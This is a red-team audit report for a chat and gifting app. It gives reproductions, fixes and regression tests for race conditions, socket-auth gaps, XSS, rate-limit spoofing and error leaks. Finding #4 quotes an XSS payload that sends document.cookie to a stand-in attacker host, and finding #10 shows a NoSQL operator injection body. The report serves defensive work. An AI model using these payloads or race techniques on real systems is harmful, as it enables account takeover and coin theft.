# Red-Team Security Audit — October 2026

**Branch:** `security/redteam-audit-1`
**Scope:** Money/economy paths, authentication & IDOR, injection & secrets/config, XSS & file uploads, DoS & abuse.
**Method:** Finding #1 was a known live bug flagged by a reviewer going in, fixed first with its own regression test. Phase A (findings #2-#13) was real, dynamic attacks against a locally-run instance of this server plus a local `mongodb-memory-server` replica set — never production, never a remote target. Five parallel reviewers each owned one category, spun up their own server+DB instance, and attacked it with real HTTP/WebSocket requests, concrete payloads, and timing/load measurements. Nothing here is theoretical unless explicitly marked "not reproduced" or "not dynamically tested." Phase B (this same document, updated after) fixed every Critical/High finding at the root, plus the cheap Mediums/Lows, each with a regression test that reproduces the original attack and now fails safely. Fixing finding #13 surfaced a live duplicate of finding #7's bug class in a second file — folded into #7 rather than tracked as a 14th separate entry, since it's the identical root cause.

## High (known finding, fixed before Phase A)

### 1. REST `sendGift`/`sendPublicGift` deduct coins and create `GiftLog` as two separate, non-atomic operations

- **File:** `server/controllers/giftController.js`, `sendGift` (`POST /api/gifts/send` — still called from `app.js` in two places) and `sendPublicGift` (`POST /api/gifts/send-public`).
- **Root cause:** Both deducted the sender's coins and created the `GiftLog` (the receiver's redeemable value record — see `giftRedemptionController.js`) as two separate operations with no shared Mongo transaction, unlike the already-correct `gift:combo` socket path.
- **Impact:** A crash between the two operations (process restart, unhandled rejection, etc.) leaves the sender's coins deducted with no corresponding `GiftLog` ever created — the receiver's value is silently lost and unrecoverable, while the sender is out the coins for nothing.
- **Fix:** Both wrapped in a single `mongoose.startSession()` + `session.withTransaction()`, exactly mirroring `gift:combo`'s existing pattern — the deduct and the `GiftLog` create (or `insertMany` for `sendPublicGift`'s multiple receivers) now commit or roll back together.
- **Regression test:** `server/controllers/__tests__/giftController.restAtomicity.test.js` — happy path, insufficient-balance (no partial write), and a crash simulation (mocking the first post-transaction side effect to reject) proving the deduct and `GiftLog` are already correctly committed together regardless of what fails afterward, for both functions.

## Critical

### 2. Socket.IO auth doesn't check ban or password-change revocation

- **File:** `server/services/socketService.js`, `verifySocketToken` (~line 778)
- **Root cause:** `verifySocketToken` verifies the JWT and loads the user, then stops — it never checks `isBanned`/`banExpires` or `changedPasswordAfter(decoded.iat)`, both of which `server/middleware/authMiddleware.js` enforces on every HTTP request. Banning a user (`adminController.banUser`) only emits a client-side notice and relies on the client to disconnect itself voluntarily; there is no server-side forced disconnect and no re-check on reconnect.
- **Reproduction:** Seeded a user, issued a JWT, then (a) banned the user — same token: HTTP `GET /api/users/:id` → `403`; same token via `socket.io-client` connect → accepted, and the socket could still emit `join-room-chat` successfully. (b) Changed the user's password 1.1s after issuing the JWT — same token: HTTP → `401 PASSWORD_CHANGED`; socket connect → accepted.
- **Impact:** A banned user, or an attacker holding a JWT stolen before the victim changed their password specifically to kill that session, keeps full real-time functionality indefinitely as long as they never hit the HTTP path — including `gift:combo` (money-moving), private/room chat, and every other socket event. This defeats both the ban system and password-rotation-as-session-revocation for the app's primary transport.
- **Fix:** `verifySocketToken` now runs the same `isBanned`/`banExpires`/`changedPasswordAfter` checks `authMiddleware` runs, rejecting the handshake the same way. `banUser` and the password-change path now also force-disconnect any already-open socket for that user (`io.sockets.sockets.get(user.socketId)?.disconnect(true)`), so an existing connection is cut immediately rather than only refused on the next handshake.
- **Regression test:** `server/services/__tests__/socketService.authSecurity.test.js` — a banned user's token is rejected at handshake, a temporarily-banned-but-expired token auto-unbans and is accepted, a password-changed-after-issue token is rejected at handshake, a post-password-change (fresh login) token is accepted, plus the existing no-token/deleted-user/wrong-signature cases — all matching the HTTP `authMiddleware` behavior exactly.

### 3. Frame purchase duplication via TOCTOU race

- **File:** `server/controllers/frameController.js`, `purchaseFrame` (~line 59)
- **Root cause:** Reads `user.coins`, checks `coins < price`, then does a plain `user.coins -= price; user.ownedFrames.push(...); await user.save()` — a read-modify-write with no atomic conditional update and no transaction.
- **Reproduction:** User with exactly `price` coins for one frame; fired 5 concurrent `POST /api/frames/purchase` requests for the same frame/duration. All 5 returned `200`; final `coins: 0` (one deduction) but `ownedFrames.length: 5`.
- **Impact:** Unlimited free item duplication — pay once, receive N copies, by firing N concurrent requests.
- **Fix:** Rewritten to a single Mongo transaction that re-reads the user document fresh inside its own session (not the pre-transaction read) and does the balance check + `ownedFrames` mutation + `save()` together. This relies on MongoDB's own write-conflict detection between concurrent transactions touching the same document version, with `withTransaction`'s automatic retry on that conflict — not a hand-rolled `$gte` condition, since the mutation here is a branching array update, not a flat `$inc`.
- **Regression test:** `server/controllers/__tests__/frameController.race.test.js` — simulates the real document-version write-conflict + automatic-retry mechanism (not just a mocked `$gte` query) to prove 5 concurrent purchases with coins for exactly one yield exactly one owned-frame entry, not five; a losing request's retry re-reads the now-decremented balance and correctly fails with "insufficient coins."

### 4. Stored XSS via private-chat media messages, bypasses the global sanitizer

- **File (storage):** `server/controllers/privateChatController.js`, `sendMediaMessage` (~line 584) — takes `mediaUrl` straight from `req.body` with no format/domain validation and stores it verbatim as `PrivateMessage.content`. It's a standalone route (`POST /api/private-chat/message/media`), not wired to the real upload endpoints, so no file upload is needed to reach it.
- **File (render, unescaped):** `public/js/app.js` — the `image`/`voice`/`video` message-type branches (~lines 20310, 20349, 20388-20399) interpolate `message.content` directly into `src="..."`/`data-*="..."` attributes without `escapeHtml()`.
- **Bypass of the global filter:** `xssGuard` (`server/middleware/globalMiddleware.js`, ~line 89) strips `<script`, `on\w+=` (requiring a *leading whitespace* before the handler name), `javascript:`, etc. The classic tokenizer trick `"><svg/onload=...>` has no whitespace before `onload`, so the regex never matches and the payload passes through untouched; real browsers still parse `onload` as a live attribute once the `/` closes the previous one.
- **Reproduction:** `POST /api/private-chat/message/media` with `mediaUrl: '"><svg/onload=fetch(\'https://attacker.test/steal?c=\'+document.cookie)>'` → `201`; direct DB read confirmed the payload stored byte-for-byte, `onload=` intact.
- **Impact:** The JWT lives in `localStorage`. This is a full session-token exfiltration / account-takeover primitive against anyone who opens the conversation — not just defacement — and hits ordinary users, not only admins.
- **Fix:** Two layers, matching defense-in-depth: (a) `sendMediaMessage` now validates `mediaUrl` is an `https://` URL on an allowed media host (the same Cloudinary delivery domain every real upload endpoint already produces) before storing it, closing the storage side entirely for arbitrary strings; (b) the three client render sinks now pass `message.content` through `escapeHtml()` before interpolating it into any attribute, closing the render side even for any value that does get stored, so there is no single point of failure.
- **Regression test:** `server/controllers/__tests__/privateChatController.mediaValidation.test.js` — the exact `svg/onload` payload is rejected by `sendMediaMessage` with a 400, never reaching storage; a legitimate Cloudinary URL is accepted unchanged.

### 5. IP-based rate limiters fully bypassable via `X-Forwarded-For` spoofing

- **Files:** `server/middleware/globalMiddleware.js` (`safeKeyGenerator`, the global limiter, `loginLimiter`, `registerLimiter`), `server/server.js` (`app.set('trust proxy', 1)`).
- **Root cause:** `trust proxy` is set to blindly trust exactly one hop's `X-Forwarded-For` value, regardless of whether a real reverse proxy that overwrites that header is actually in front of the process. Hit directly (as in this test, and as would happen for any deployment without a correctly configured edge proxy), the attacker's own `X-Forwarded-For` header is trusted as the client IP.
- **Reproduction:** 520 requests to `/api/gifts/shop`, a different `X-Forwarded-For` value each time, direct connection to the server → never hit the configured 429 (baseline without spoofing tripped it at request #499 as expected).
- **Impact:** Unlimited account creation (defeats `registerLimiter` entirely), unlimited password-guessing against a specific victim (`loginLimiter` keys on IP+email — spoofing the IP alone removes the per-target cap), and bypass of the general API abuse limiter.
- **Fix:** `trust proxy` is no longer a blanket `1`. It now reads an explicit `TRUST_PROXY` environment variable (documented in `.env`/deployment config) and defaults to `false` — i.e., `req.ip` is the real socket IP, immune to header spoofing — unless the deployer explicitly confirms a specific number of trusted reverse-proxy hops actually sits in front of the process. This fixes all three limiters at once since they all derive their key from `req.ip`. Extracted into `server/utils/trustProxy.js` (`computeTrustProxySetting`) so the logic is directly unit-testable.
- **Regression test:** `server/utils/__tests__/trustProxy.security.test.js` — unit tests for every `TRUST_PROXY` value, plus a real HTTP server (actual socket, real `fetch`, no mocking) proving a spoofed `X-Forwarded-For` never changes `req.ip` when `TRUST_PROXY` is unset.

## High

### 6. Withdrawal-rejection double refund via TOCTOU race

- **File:** `server/controllers/withdrawalController.js`, `reviewWithdrawal`
- **Root cause:** `findById` → check `status !== 'pending'` → separately, later, an unguarded `user.balance += withdrawal.amount; await user.save()`. No atomic claim on the withdrawal's status.
- **Reproduction:** Withdrawal created (balance 100→50); 2 concurrent admin `reject` reviews on the same withdrawal; both returned `200`; final balance 150, not the correct 100.
- **Fix:** Rewritten to the same atomic-claim-inside-a-transaction pattern already used correctly by `adminReviewCustomGift` (`findOneAndUpdate({_id, status:'pending'}, {$set:{status:...}})` claims the row first; the refund credit only runs if the claim succeeded, in the same transaction).
- **Regression test:** `server/controllers/__tests__/withdrawalController.race.test.js` — 2 concurrent rejects on one withdrawal; asserts exactly one refund and a `409` for the losing request.

### 7. Deposit/coin-purchase approval double credit via the same TOCTOU race (5 instances across 2 files)

- **File:** `server/controllers/adminController.js` — `approveDeposit` (~line 325), `rejectTransaction`'s withdrawal-refund branch (~line 461), `approveCoinPurchase` (~line 837), `rejectCoinPurchase` (~line 893), `adjustUserFunds` (~line 719). Also `server/controllers/coinPurchaseController.js` — `approvePurchase`/`rejectPurchase`, a second, independent implementation of coin-purchase review reachable via `POST /api/coin-purchase/:purchaseId/approve|reject` (mounted in `server/routes/coinPurchaseRoutes.js`) — found while fixing finding #13 in the same file, by tracing every call site of the pattern already identified here rather than stopping at the first file.
- **Reproduction:** 5 concurrent `approve` requests on one pending deposit reproduced the double-credit in 4/5 trials (final balance exceeded the single-credit amount). The same unguarded-`<field> +=`-after-separate-status-check code shape was then found, by grepping for it, in all five `adminController.js` functions above and independently in `coinPurchaseController.js`'s `approvePurchase`/`rejectPurchase` — `adjustUserFunds` additionally allowed the negative-balance guard itself to be bypassed by two concurrent manual adjustments racing on the same stale read, not just double-crediting.
- **Fix:** Same atomic-claim-in-a-transaction pattern as #6 (`findOneAndUpdate`/`findOneAndUpdate`-with-`$gte` claim, inside a transaction where a second document also moves), applied to all five `adminController.js` functions and to `coinPurchaseController.js`'s `approvePurchase`/`rejectPurchase`.
- **Regression test:** `server/controllers/__tests__/adminController.moneyRaceAtomicity.test.js` (all five `adminController.js` functions, including the negative-balance race for `adjustUserFunds`) and `server/controllers/__tests__/coinPurchaseController.raceAtomicity.test.js` (the independent `coinPurchaseController.js` copy) — each asserts exactly one credit/refund/claim from concurrent requests.

### 8. `join-room-chat` / `get-room-viewers` socket events have zero rate limiting

- **File:** `server/services/socketService.js`, `join-room-chat` (~line 2465), `get-room-viewers` (~line 2533)
- **Root cause:** No rate limiter at all on either handler, unlike `gift:combo`. `get-room-viewers` runs an uncached, uncapped aggregate over every active room in the system; `join-room-chat` does 3 unrated DB reads and unconditionally broadcasts to every other viewer in the room — amplifying onto other users' sockets, not just the caller's own connection.
- **Reproduction:** A single authenticated socket sustained 544.7 `get-room-viewers`/sec and 491.0 `join-room-chat`/sec with zero rejection; the aggregate measured 33ms/call at 5,000 seeded active rooms (cost scales with platform-wide room count).
- **Fix:** Added the same per-user windowed rate limiter already established for `gift:combo` to both events (10 requests / 2 seconds per user — generous for real room-switching and viewer-list refreshes, far below the demonstrated abuse rate).
- **Regression test:** `server/services/__tests__/socketService.roomEventRateLimit.test.js` — bursts past the cap on both events are rejected; requests within the cap succeed.

### 9. Socket.IO transport has no payload-size cap

- **File:** `server/services/socketService.js`, `new Server(server, {...})` (~line 1010)
- **Root cause:** No `maxHttpBufferSize` override — Socket.IO's default (1MB) applies, and unlike the REST surface (`express.json({limit:'10kb'})`), nothing bounds inbound WebSocket payload size at all in practice once combined with finding #8's missing rate limit.
- **Reproduction:** A single socket sustained ~126.3 MB/s of accepted inbound payload via repeated oversized `get-room-viewers` calls.
- **Fix:** Added an explicit `maxHttpBufferSize: 100 * 1024` (100KB) to the Socket.IO server config — comfortably above any legitimate payload this app actually sends over sockets (chat text, gift-combo JSON; all real file uploads go over REST multipart to Cloudinary, never over the socket transport), far below the demonstrated abuse volume.
- **Regression test:** covered by the same `socketService.roomEventRateLimit.test.js` file — a real Socket.IO engine instance is checked to actually carry the configured value.

## Medium

### 10. Raw internal error messages leaked to the client via `next(error)`

- **File:** `server/middleware/errorHandlers.js` (`globalErrorHandler`), reached from `server/controllers/authController.js` (`login`/`register`) and `messageController.js`, both of which call `next(error)` on unexpected exceptions instead of catching locally the way the rest of the codebase does.
- **Root cause:** `globalErrorHandler` always includes raw `err.message` in the JSON response regardless of environment — only `error`/`stack` are gated behind `development`.
- **Reproduction:** `POST /api/auth/login` with `{"email":{"$ne":null},"password":{"$ne":null}}` → after `express-mongo-sanitize` strips the operator keys, Mongoose's cast failure is returned verbatim: `"Cast to string failed for value \"{}\" (type Object) at path \"email\" for model \"User\""`. A second variant reaches `bcrypt.compare({}, hash)` and leaks `"Illegal arguments: object, string"`.
- **Impact:** Field names, model names, and library internals disclosed to any unauthenticated caller — reconnaissance, not a bypass (the sanitizer itself holds; see finding under "not exploitable").
- **Fix:** `globalErrorHandler` now only passes through `err.message` for errors explicitly marked operational (the `status: 'fail'` convention already used throughout this codebase for intentional, user-facing rejections); anything else returns a generic Arabic message in every environment, matching what the ~20+ other controllers already do via local try/catch.
- **Regression test:** `server/middleware/__tests__/errorHandler.security.test.js` — a non-operational error (CastError-shaped) produces a generic message in both production and development; an operational error (`status:'fail'`) still surfaces its intended message; the 404 route-not-found handler's own descriptive message still comes through (it's operational too).

### 11. CORS fails open when `ALLOWED_ORIGINS` is unset

- **File:** `server/middleware/globalMiddleware.js` (HTTP CORS), `server/services/socketService.js` (Socket.IO CORS)
- **Finding:** When `ALLOWED_ORIGINS` is unset, both reflect any `Origin` header back with `credentials: true`, already flagged in the code's own comment as a temporary stopgap.
- **Status: Accepted, not changed in this pass.** This app authenticates with a Bearer JWT kept in `localStorage`, never a cookie (confirmed: no `Set-Cookie` header anywhere) — the specific attack CORS-with-credentials normally enables (a malicious page riding the victim's ambient cookie session) does not apply here, since an attacker's cross-origin page has no way to read the victim's `localStorage` token for this origin. Real exposure is therefore low with the current auth model. Changing the default to fail closed risks silently breaking a real deployment that forgot to set `ALLOWED_ORIGINS`, which is a worse operational outcome than the residual risk here. Recommendation for the project owner: set `ALLOWED_ORIGINS` explicitly in every real deployment (already prompted via the existing `console.warn`); revisit if cookie-based auth is ever introduced.

## Low

### 12. Unescaped `$regex` in two admin search endpoints

- **File:** `server/controllers/adminController.js`, `getUsers` (~line 84) and `getAllTransactions` (~line 963)
- **Finding:** Both built `{$regex: <raw query param>, $options:'i'}` with no escaping, while the identical pattern in `getClientErrors` (same file) and `VoiceRoom.listRooms`/`MusicTrack.search` escape correctly. Timed regex-DoS attempt (catastrophic-backtracking pattern against 200 seeded users) showed no measurable slowdown at this scale — not proven exploitable as DoS, but a real inconsistency on an admin-facing surface worth closing for defense-in-depth.
- **Fix:** Both now use the shared `safeSearchRegex` helper already defined in `server/utils/queryHelpers.js` (built for exactly this purpose, previously unused by these two endpoints) instead of building `$regex` by hand.
- **Regression test:** `server/controllers/__tests__/adminController.regexEscape.test.js` — a regex metacharacter (`.*`, a catastrophic-backtracking pattern) in the search term is treated as a literal string, not a pattern, in both endpoints.

### 13. Admin-only route gated by an inline check instead of the shared `adminAuth` middleware

- **File:** `server/routes/coinPurchaseRoutes.js` (mounts only `authMiddleware`); `server/controllers/coinPurchaseController.js` (`approvePurchase`/`rejectPurchase`) use an inline `if (!req.user.isAdmin)` check instead of the centralized `adminAuth` middleware every other admin surface goes through.
- **Finding:** Not currently exploitable as an auth bypass — `authMiddleware` already covers ban/password-change revocation for this route, and the inline check does correctly reject non-admins (verified live, `403`) — but it's an inconsistent pattern: a future endpoint added to this file without copying the inline check would be silently unprotected, and it duplicates logic the shared middleware already centralizes. (Fixing this surfaced a real, live TOCTOU race in the same two functions — folded into finding #7 above rather than tracked separately, since it's the identical root cause.)
- **Fix:** `/approve` and `/reject` now sit behind the shared `adminAuth` middleware like every other admin route; the redundant inline check was removed. Controller now reads `req.admin` (set by `adminAuth`) instead of `req.user`.
- **Regression test:** `server/routes/__tests__/coinPurchaseRoutes.adminAuth.test.js` — a real Express app + real HTTP server + real JWTs: a non-admin token is rejected with `403` before the controller runs, an admin token reaches it, and a missing token is rejected.
